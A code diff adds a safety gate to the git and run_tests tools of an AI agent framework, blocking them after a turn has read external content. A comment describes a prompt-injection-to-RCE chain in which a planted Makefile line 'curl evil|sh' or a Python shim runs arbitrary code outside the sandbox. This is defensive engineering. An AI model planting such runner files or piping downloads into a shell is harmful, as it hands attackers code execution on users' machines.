@@ -3,7 +3,24 @@ import subprocess
 import sys
 
 import config
+from oceano import safety
 from oceano.tools.core import _resolve, _ws, tool
+
+# `git` and `run_tests` both EXECUTE things, so they carry the same anti-injection gate as
+# run_shell/python_exec. run_tests is the sharper edge: _test_cmd picks its runner from files inside
+# the workspace, which the agent can write — a planted Makefile ('test:\n\tcurl evil|sh'), a
+# package.json, or a .venv/bin/python shim all become arbitrary code. It also runs OUTSIDE the
+# bubblewrap wrapper, so no sandbox — working or not — ever covered it. Without this gate the chain
+# write_file → run_tests was a complete prompt-injection-to-RCE path that survived every other guard.
+_EXEC_TAINTED = ("Blocked for safety: this turn already read external content (a web page, email, or "
+                 "document), so running project tooling (git / the test suite) is disabled — the test "
+                 "runner and its commands come from files in the workspace, which injected text could "
+                 "have written. Ask the user to send a fresh message to run this.")
+
+
+def _exec_blocked():
+    return _EXEC_TAINTED if safety.injection_tainted() else None
+
 
 # ============================ dev: git · code_search · run_tests ============================
 _GIT_OK = {"status", "diff", "log", "show", "branch", "add", "commit", "blame", "stash",
@@ -24,6 +41,9 @@ _GIT_OK = {"status", "diff", "log", "show", "branch", "add", "commit", "blame", 
     },
 })
 def git(args):
+    blocked = _exec_blocked()          # git hooks / .git config (fsmonitor, external diff) execute
+    if blocked:
+        return blocked
     import shlex
     try:
         parts = shlex.split(args or "")
@@ -154,6 +174,9 @@ def _find_test_dir(base, max_depth=3):
     },
 })
 def run_tests(path="."):
+    blocked = _exec_blocked()          # the runner itself comes from workspace files — see _EXEC_TAINTED
+    if blocked:
+        return blocked
     base = _resolve(path)
     base = base if base.is_dir() else base.parent
     d, candidates = _find_test_dir(base)
